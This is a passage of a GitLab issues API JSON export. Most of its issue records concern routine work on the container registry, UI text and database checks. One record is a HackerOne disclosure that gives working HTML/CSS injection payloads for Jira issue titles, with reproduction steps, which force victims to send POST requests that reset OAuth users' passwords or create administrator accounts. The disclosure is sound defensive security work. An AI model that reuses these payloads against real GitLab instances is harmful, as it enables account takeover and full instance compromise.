Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359300","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359300","notes":"https://gitlab.com/api/v4/projects/278964/issues/359300/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359300/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359300","relative":"#359300","full":"gitlab-org/gitlab#359300"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7316,"epic":{"id":408066,"iid":7316,"title":"Drive the Container Registry migration Phase 2 from Rails","url":"/groups/gitlab-org/-/epics/7316","group_id":9970,"human_readable_end_date":"Jul 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106699101,"iid":359277,"project_id":278964,"title":"Container Registry is only showing 100 tags per image","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\nWhen pushing more than 100 tags for one image in the container registry, the tag count will stay at 100.\n\nThe tag list is also limited to 100 tags â€“ when there's more than 100 images, you'll only be able to browse through exactly ten pages with ten tags each.\n\nThose 100 tags appear to be the same even when changing sorting direction, presumably as sorting is done after receiving the data.\n\nThe tags in question _are_ in the registry and can be pulled successfully.\n\nSide note: While trying to find an existing issue for this particular behavior, we noticed that the same limit of 100 tags per image was chosen for gitlab-org/gitlab#350920+\n\n### Steps to reproduce\n\n1. Create new project\n2. Push more than 100 tags for one image to Container Registry (see script below)\n3. Observe \"100\" as the tag count and being unable to view some tags\n\n```bash\n#!/bin/bash\nfor i in {1..105}\ndo\n docker build -t registry.gitlab.com/manuelgrabowski/registry-test:$i .\n docker push registry.gitlab.com/manuelgrabowski/registry-test:$i\ndone\n```\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\nhttps://gitlab.com/manuelgrabowski/registry-test/container_registry/2920556\n\n### What is the current *bug* behavior?\n\nOnly 100 tags are shown in the UI.\n\n### What is the expected *correct* behavior?\n\nAll tags are shown in the UI.\n\n### Relevant logs and/or screenshots\n\n![image](/uploads/c655b768920524a411a40787df2c6b3a/image.png)\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\nThis bug happens on GitLab.com\n\n### Possible fixes\n\nWe believe the reason for this to be that pagination has been implemented in the Container Registry fork, but is not yet being used for this UI. Implementing the existing issue gitlab-org/gitlab#325760+ would likely fix this problem as well.\n\n`const maximumReturnedEntries = 100` is defined in [catalog.go#L19](https://gitlab.com/gitlab-org/container-registry/-/blob/v3.39.0-gitlab/registry/handlers/catalog.go#L19) and appears to be used by `GetTags` in [tags.go#L86](https://gitlab.com/gitlab-org/container-registry/blob/v3.39.0-gitlab/registry/handlers/tags.go#L86).\n\nWe believe the above code to be what responds to a `/v2/\u003cproject\u003e/tags/list` API call. This call is made from the Rails app in `repository_tags` [client.rb#L55-57](https://gitlab.com/gitlab-org/gitlab/blob/v14.9.3-ee/lib/container_registry/client.rb#L55-57), which is called from `manifest` [container_repository.rb#L358](http://gitlab.com/gitlab-org/gitlab/blob/v14.9.3-ee/app/models/container_repository.rb#L358), finally leading us to `tags_count` in [container_repository.rb#L371-375](https://gitlab.com/gitlab-org/gitlab/-/blob/v14.9.3-ee/app/models/container_repository.rb#L371-375)\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e","state":"closed","created_at":"2022-04-15T15:21:28.633Z","updated_at":"2023-01-13T14:05:36.394Z","closed_at":"2022-09-23T19:06:18.997Z","closed_by":{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},"labels":["Category:Container Registry","Stretch","backend","customer","devops::package","group::package registry","package:active","priority::2","rails","section::ops","severity::3","type::bug","workflow::verification"],"milestone":{"id":2453027,"iid":77,"group_id":9970,"title":"15.5","description":"","state":"active","created_at":"2022-02-03T22:29:56.909Z","updated_at":"2022-02-03T22:29:56.909Z","due_date":"2022-10-17","start_date":"2022-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/77"},"assignees":[{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"}],"author":{"id":10339034,"username":"manuelgrabowski","name":"Manuel Grabowski","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10339034/avatar.png","web_url":"https://gitlab.com/manuelgrabowski"},"type":"ISSUE","assignee":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"user_notes_count":49,"merge_requests_count":0,"upvotes":16,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359277","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359277","notes":"https://gitlab.com/api/v4/projects/278964/issues/359277/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359277/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359277","relative":"#359277","full":"gitlab-org/gitlab#359277"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106693389,"iid":359255,"project_id":278964,"title":"Reset registry migration data for images with more than 100 tags","description":"## Background\n\nAs we [rollout the new container registry](https://gitlab.com/groups/gitlab-org/-/epics/5523) on production, we have started by migrating all [images with less than 100 tags](https://gitlab.com/gitlab-org/container-registry/-/issues/374#two-pass-approach). Once completed, we will be importing the images with more than 100 tags.\n\nCurrently, when an image with more than 100 tags is found, we skip it. So before we are able to import them, we need to reset their state.\n\n## Proposal\n\nCreate two migrations and one code update:\n\n1. Update the Enqueuer so if the `max_tags_count` is 0, we ignore the tag count (return true): https://gitlab.com/gitlab-org/gitlab/-/blob/039e424729bb768eb0964ecaa00a42bb00eae71a/app/workers/container_registry/migration/enqueuer_worker.rb#L68\n1. Create a background migration (possibly a post-deployment migration depending on timing) to update all container repositories with `migration_state: 'skipped', migration_skipped_reason: :too_many_tags` back to `migration_state: 'default'`\n1. After the migration is complete, make a change request to update `application_settings.container_registry_import_max_tags_count` to 0","state":"closed","created_at":"2022-04-15T12:54:30.787Z","updated_at":"2022-05-25T14:12:49.642Z","closed_at":"2022-05-25T14:12:30.639Z","closed_by":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"labels":["Category:Container Registry","Container Registry Migration","Container Registry Migration::Phase 2","auto updated","backend","database","devops::package","group::package registry","ruby","section::ops","type::maintenance","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"}],"author":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"type":"ISSUE","assignee":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359255","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359255","notes":"https://gitlab.com/api/v4/projects/278964/issues/359255/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359255/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359255","relative":"#359255","full":"gitlab-org/gitlab#359255"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7316,"epic":{"id":408066,"iid":7316,"title":"Drive the Container Registry migration Phase 2 from Rails","url":"/groups/gitlab-org/-/epics/7316","group_id":9970,"human_readable_end_date":"Jul 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106670934,"iid":359145,"project_id":278964,"title":"Related issues/epics empty state update","description":"From https://gitlab.com/gitlab-org/gitlab/-/issues/354769. On the issue detail and epic detail page, update the related items component:\n\n\u003e {-Remove-} the `info` icon and link, and add copy to the body of the widget with context on use case. Add a {+learn more+} link within this copy that links out to the docs page that the `info` icon previously linked to.\n\n\n## Solution\n\nShow Free users:\n\n\u003e Link issues together to show that they're related. [Learn more.](https://docs.gitlab.com/ee/user/project/issues/related_issues.html)\n\nShow Premium+ users:\n\n\u003e Link issues together to show that they're related or that one is blocking others. [Learn more.](https://docs.gitlab.com/ee/user/project/issues/related_issues.html)\n\nShow Ultimate users:\n\n\u003e Link epics together to show that they're related or that one is blocking others. [Learn more.](https://docs.gitlab.com/ee/user/project/epics/linked_epics.html)\n\n---\n\nReminder for implementation that we now want to add `aria-role` to `Learn more.` links: https://design.gitlab.com/usability/helping-users/#learn-more\n\nSo, here, they'd be:\n\n\u003e Learn more about linking issues.\n\n\u003e Learn more about linking epics.\n\n## Docs Support\n\nFor issues requiring an update to GitLab docs, please note that this is part of the definition of done for this issue. Please create a separate MR for the docs update related to the MR for the actual change to ensure code reviews are not blocked by TW reviews.\n\n- [ ] This issue requires an update to GitLab docs\n- [x] This issue does not require an update to GitLab docs","state":"closed","created_at":"2022-04-14T23:13:54.163Z","updated_at":"2022-11-03T01:54:38.201Z","closed_at":"2022-11-03T01:54:38.170Z","closed_by":{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"},"labels":["SUS::Impacting","UI text","Unplanned","auto updated","devops::plan","documentation","feature::enhancement","frontend","group::product planning","section::dev","severity::3","type::feature","usability","workflow::production"],"milestone":{"id":2687593,"iid":81,"group_id":9970,"title":"15.6","description":"","state":"active","created_at":"2022-07-06T19:22:27.893Z","updated_at":"2022-07-06T19:22:27.893Z","due_date":"2022-11-17","start_date":"2022-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/81"},"assignees":[{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"}],"author":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"type":"ISSUE","assignee":{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"},"user_notes_count":15,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359145","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":1},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"1 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359145","notes":"https://gitlab.com/api/v4/projects/278964/issues/359145/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359145/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359145","relative":"#359145","full":"gitlab-org/gitlab#359145"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7733,"epic":{"id":469902,"iid":7733,"title":"ðŸŽ¨ Epic linking MVC design updates","url":"/groups/gitlab-org/-/epics/7733","group_id":9970,"human_readable_end_date":"Nov 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106670590,"iid":359143,"project_id":278964,"title":"Check UsageData table size","description":"An follow up issue for https://gitlab.com/gitlab-services/version-gitlab-com/-/merge_requests/676#note_912916151\n\nRelated to https://gitlab.com/gitlab-org/gitlab/-/issues/345390\n\n# Description\nWe're storing ServicePing errors in Version DB now. This is a follow up issue to make sure the new table isn't growing too fast.\n\n# Action\n\nCheck size of the new table\n\nIf the table grown significantly, we can either begin dropping old records or reconsider storing errors in the DB and send it elsewhere.\n\n1. [Open terminal for Version app (Environments -\u003e Terminal)](https://gitlab.com/gitlab-services/version-gitlab-com#running-rails-console)\n2. `ActiveRecord::Base.connection.execute(\"SELECT pg_size_pretty( pg_total_relation_size('usage_errors') );\").to_a`","state":"closed","created_at":"2022-04-14T22:49:09.870Z","updated_at":"2022-06-29T14:38:19.226Z","closed_at":"2022-06-29T14:38:11.039Z","closed_by":{"id":2890431,"username":"amandarueda","name":"Amanda Rueda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2890431/avatar.png","web_url":"https://gitlab.com/amandarueda"},"labels":["Category:Service Ping","[deprecated] Accepting merge requests","backend","devops::analytics","group::product intelligence","product intelligence::onboarding issue","section::analytics","type::maintenance","won't do","workflow::problem validation"],"milestone":null,"assignees":[],"author":{"id":9712164,"username":"nbelokolodov","name":"Niko Belokolodov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9712164/avatar.png","web_url":"https://gitlab.com/nbelokolodov"},"type":"ISSUE","assignee":null,"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359143","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359143","notes":"https://gitlab.com/api/v4/projects/278964/issues/359143/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359143/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359143","relative":"#359143","full":"gitlab-org/gitlab#359143"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7033,"epic":{"id":378924,"iid":7033,"title":"Insights into Service Ping Timeouts","url":"/groups/gitlab-org/-/epics/7033","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106670277,"iid":359142,"project_id":278964,"title":"Content injection in Jira issue title enabling sending arbitrary POST request as victim","description":"**[HackerOne report #1533976](https://hackerone.com/reports/1533976)** by `joaxcar` on 2022-04-07, assigned to @ankelly:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n####  Summary\n\nThe issue described here leads to the same outcome as my previous report, https://hackerone.com/reports/1409788 . So look into that one for further details on the JavaScript gadgets. Also see my report https://hackerone.com/reports/1481207 for a detailed rundown of injections in GitLab.\n\nThis time it is the `title` field of Jira issue pages that renders without proper HTML encoding. Leading to HTML and CSS injection. By abusing a script gadget and a browser quirk (tested on Chrome and Firefox) the injection can be escalated into a highly dangerous arbitrary POST request. Depending on the payload, this POST request can lead to account takeover(of OAuth/SAML accounts) and also generation of admin accounts giving full access to the whole instance.\n\nFor the H1 triager it is OK to skip to the POC as the description will contain a lot of GitLab specifics.\n\n####  Background  \nThere is a premium feature in GitLab where a user can connect a project with a Jira tracker. See https://docs.gitlab.com/ee/integration/jira/ . When this is set up there will be a path in the project like so: https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues where any tasks created in Jira will be automatically fetched and presented to the members of the project.\n\nGiving a task in Jira a title containing HTML will (if the Jira integration is set up in the project) generate an Jira issue in GitLab with the same title. When viewing the Jira issue details page (https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/ISO-1) this title field will be displayed without proper HTML encoding and thus render the supplied HTML. The caveat here is that this HTML will be sanitized by DOMPurify as it is added through the Vue `v-safe-html` attribute.\n\nBut as I have shown in my previous reports, there exists some JavaScript gadgets that slips through DOMPurify in your current default settings.\n\nIf you reed my other reports you can also see that there exists a gadget leading to full XSS, this do require the injected data to be present in the page on initial load. In this case, the data is fetched in a subsequent request and thus miss the first run through main.js\n\nWhen a detail page for a Jira issue is first visited, the call for the issue data is actually too slow to hit the second tier of JavaScript gadgets (the code inside defered_execution in main.js). But I found a way to bypass this. When a browser leaves a page to visit another page, and then uses History.back (or the back button in the browser) the browser will not generate a complete rerun of the previous requests. It will instead use cached data, even for the data that is not supposed to be cached. So I found out that visiting a infected Jira issue page, browsing away from the page, and then clicking the back button to get to the Jira issue again, will speed up the data call to have it hit by the deferred part of main.js\n\nTo weaponize this, all we need is to first navigate away from the page to a server that just runs `History.back()` to directly redirect the user back to the malicious issue page and the payload will now trigger. All this can be made almost guarantied as the injection also allows for arbitrary CSS to be loaded. This makes it possible to craft a page that have an overlay link that will trigger on clicking anywhere.\n\n####  The payload  \nI will present two payloads that will show the potential damage from this attack.\n\nThere exists a limitation as for the injection, as Jiras tasks have a 255 letter limit. This is not much to work with, but with some trix we can still get both account takeover and admin creation to work inside this payload.\n\nFirst of we have a payload that will be able to perform account takeovers on accounts that do not have a password set. This is all OAuth registered accounts (and as far as I understand also SAML and maybe LDAP accounts). These accounts have an auto generated (strong! As of 14.9.2) password after the user signs up with, for example \"sign in with GitHub\". If the user does not actively go to `/profile/password/edit` and add a new password, the account is vulnerable to this attack. The password update page does not require \"current password\" before an initial password has been set. The payload looks like this  \n```  \n\u003ca href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put\u0026user%5Bnew_password%5D=12345678\u0026user%5Bpassword_confirmation%5D=12345678'\u003e.\u003c/a\u003e\u003cstyle\u003e[@]import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css  \n```  \nIf we pull this apart, we have  \n```  \n\u003ca   \n  href=http:j15.se \u003c--- a site that when visited just throws the user back, saving some chars by omiting slashes  \n  class=js-feature-highlight \u003c--- the classname to be used as a gadget  \n  data-dismiss-endpoint='/-/profile/password?_method=put\u0026user%5Bnew_password%5D=12345678\u0026user%5Bpassword_confirmation%5D=12345678'  \n  ^--- The payload where the POST request will get sent  \n  \u003e  \n.\u003c/a\u003e \u003c--- close the anchor tag  \n\u003cstyle\u003e[@]import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css  \n  ^--- Unlimited styling to make the website a bulletproof click machine :)  \n```  \nThis will generate a link covering the whole screen. When clicked (by clicking anywhere) the browser will go to http://j15.se which is a site that directly throws the user back to where it came from. This time, the browser will fetch the data from its cache and thus make the main.js hit the payload. The user will now have to click the page again to actually send the payload. It is two required clicks, but as we have full CSS control we can make it almost guarantied that a user will try to click somewhere on our page.\n\nWhen the payload have fired, the OAuth user will have a new password. The user will be logged out but nothing else will point to the password having been set. Account takeover complete!\n\n\nThis payload will add a new administrator to the instance if an administrator visits the malicious page  \n```  \n\u003ca href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/api/v4/users?admin=true\u0026email=j@j15.se\u0026name=h\u0026username=hack\u0026password=12345678\u0026skip_confirmation=true'\u003e.\u003c/a\u003e\u003cstyle\u003e[@]import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css  \n```  \nPulled apart  \n```  \n\u003ca href=http:j15.se  \n  class=js-feature-highlight  \n  data-dismiss-endpoint='/api/v4/users?admin=true\u0026email=j@j15.se\u0026name=h\u0026username=hack\u0026password=12345678\u0026skip_confirmation=true'\u003e  \n.\u003c/a\u003e  \n\u003cstyle\u003e[@]import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css  \n```\n\n\n####  Steps to reproduce\n\nThis requires three things:  \n1. access to a premium subscription (no problem on GitLab.com as there are free trials, they work great for the attack)  \n2. a Jira server. I used a cloud Jira instance on atlassian.com  \n3. a third party account that is not registered on GitLab. ex a GitHub user\n\nPOC:  \n1. Create a user `attacker`  \n2. Log in as `attacker` and create a group `attack_group` by visiting https://gitlab.com/groups/new (make sure the group have premium access)  \n3. Create a new project in the group called `attack_proj`  \n4. Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/edit  \n5. Follow the guide at https://docs.gitlab.com/ee/integration/jira/issues.html#view-jira-issues to enable viewing Jira issues in the project  \n6. Log in to Jira and create a task on the dashboard and name it `\u003cimg src=#\u003e`  \n7. Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues and make sure the task is shown as an issue  \n8. Click the issue to open the Issue details page. The title will render as a broken image. This proves the injection.\n\n![img.jpg](https://h1.sec.gitlab.net/a/715a864c-2251-45fa-ab22-505ee9319798/img.jpg)\n\n9. Now go back to Jira and create a new task and name it  \n```  \n\u003ca href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put\u0026user%5Bnew_password%5D=12345678\u0026user%5Bpassword_confirmation%5D=12345678'\u003e.\u003c/a\u003e\u003cstyle\u003e[@]import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css  \n```  \n10. Go back to the issue list and refresh to make sure it is created  \n11. Now log in to GitLab.com with a third party provider, generating a new account on GitLab.com  \n12. (if the test project is not public invite the new user to the project as a Developer by visiting https://gitlab.com/atack_group/attack_proj/-/project_members)  \n13. Now visit the https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues list with the OAuth user and click the task with the payload  \n14. A page will show up looking empty, click anywhere on the page  \n15. The page will flicker, and now when you hover over the page it will show a big blue button stating \"Got it!\". Click it\n\n![gotit.jpg](https://h1.sec.gitlab.net/a/5946e4a0-f445-430d-880a-3b0296d5033e/gotit.jpg)\n\n16. Refresh the page, you should now be logged out from GitLab.com  \n17. Log in with the OAuth email and the password `12345678`\n\nAccount takeover!\n\nImportant to note here is that the second click on the blue button can be made invisible as the first click. I did not want to spend my whole day in CSS but can get back with it if needed! :)\n\n####  Impact\n\nHTML and CSS injection in Jira issue page can make POST request as victim user. Can lead to account takeover or admin user escalation.\n\n####  What is the current *bug* behavior?\n\nThe name/title field in the Jira issue page is not sanitized\n\n####  What is the expected *correct* behavior?\n\nThe name should be shown sanitized\n\n####  Output of checks\n\nThis bug happens on GitLab.com\n\n####  Impact\n\nAccount takeover and admin user creation through arbitrary POST request in Jira issue\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [img.jpg](https://h1.sec.gitlab.net/a/715a864c-2251-45fa-ab22-505ee9319798/img.jpg)\n* [gotit.jpg](https://h1.sec.gitlab.net/a/5946e4a0-f445-430d-880a-3b0296d5033e/gotit.jpg)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues","state":"closed","created_at":"2022-04-14T22:28:30.886Z","updated_at":"2022-11-22T18:44:28.357Z","closed_at":"2022-06-01T23:53:42.258Z","closed_by":{"id":9820844,"username":"nmalcolm","name":"Nick Malcolm","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9820844/avatar.png","web_url":"https://gitlab.com/nmalcolm"},"labels":["Deliverable","HackerOne","Weakness::CWE-99","backend","bug::vulnerability","devops::manage","group::integrations","priority::2","section::dev","security","severity::2","type::bug","workflow::awaiting security release"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":423116,"username":"toupeira","name":"Markus Koller","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7585ed50675c4febe7619f25b44f7fe0?s=80\u0026d=identicon","web_url":"https://gitlab.com/toupeira"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":423116,"username":"toupeira","name":"Markus Koller","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7585ed50675c4febe7619f25b44f7fe0?s=80\u0026d=identicon","web_url":"https://gitlab.com/toupeira"},"user_notes_count":22,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-05-26","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359142","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359142","notes":"https://gitlab.com/api/v4/projects/278964/issues/359142/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359142/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359142","relative":"#359142","full":"gitlab-org/gitlab#359142"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":106669341,"iid":359137,"project_id":278964,"title":"Define Opportunity Map for Incident Response","description":"Collaborate with @kbychu on refining the Incident Response map: https://app.mural.co/t/gitlab2474/m/gitlab2474/1648752385561/ef9dc7f17d476526f19051061db46ac9086e8092?sender=abauerly8152","state":"closed","created_at":"2022-04-14T21:41:04.634Z","updated_at":"2022-05-13T16:03:21.249Z","closed_at":"2022-05-13T16:03:21.126Z","closed_by":{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"},"labels":["Category:Incident Management","UX","devops::monitor","group::respond","section::ops","type::feature"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"}],"author":{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"},"type":"ISSUE","assignee":{"id":2799498,"username":"ameliabauerly","name":"Amelia 